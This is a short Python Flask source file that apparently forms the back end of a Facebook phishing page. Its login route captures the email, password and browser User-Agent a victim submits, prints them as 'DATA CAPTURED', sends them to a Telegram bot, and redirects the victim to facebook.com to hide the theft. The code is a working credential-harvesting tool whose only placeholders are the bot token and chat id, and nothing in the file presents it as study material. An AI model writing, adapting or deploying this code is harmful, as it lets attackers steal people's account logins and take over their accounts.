from flask import Flask , request, url_for, redirect, render_template
import requests


app = Flask(__name__)

def send_to_telegram(message):
    #put your actual token here if you want to send telegram
    token = "Your bot token"
    chatid = "your bot chat id"

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chatid,
        "text": message
    }
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print("Couldn't send message")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('email')
    password = request.form.get('password')
    usr_agent = request.headers.get('User-Agent')

    data = f"Phishing Data\nUsername: {username}\nPassword: {password}\nDevice: {usr_agent}"
   
    print ('\n DATA CAPTURED')
    print(f"username: {username}")
    print(f"password: {password}")
    print(f"Device Info: {usr_agent}")

    print("----------------------------------------\n")
    send_to_telegram(data)

    return redirect('https://facebook.com/')

if __name__ == '__main__':
    app.run(debug=True)